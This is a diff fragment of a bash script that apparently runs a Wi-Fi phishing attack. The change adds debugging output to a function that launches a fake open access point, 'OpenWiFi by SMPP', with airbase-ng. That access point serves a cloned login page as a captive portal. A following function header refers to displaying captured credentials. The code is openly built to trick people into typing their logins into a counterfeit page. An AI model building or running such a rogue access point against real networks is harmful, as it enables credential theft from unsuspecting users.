@@ -131,15 +131,20 @@ start_monitor_mode() {
 
 # Function to start fake AP with captive portal
 # Function to start fake AP with captive portal
+# Function to start fake AP with captive portal
 start_fake_ap() {
     interface=$1
     echo "Starting fake access point with captive portal on interface $interface..."
+
     # Get the selected server's login page
     server_login_page=$(ls ./sites/"$server"/login.*)
+    echo "Server login page: $server_login_page"  # Debugging output
 
     # Start fake AP with the selected server's login page
     xterm -e "airbase-ng -a AA:BB:CC:DD:EE:FF -e 'OpenWiFi by SMPP' -c 6 -P '$server_login_page' '$interface'" &
+    echo "Fake AP started."  # Debugging output
 }
+
 
 
 # Function to continuously display captured credentials
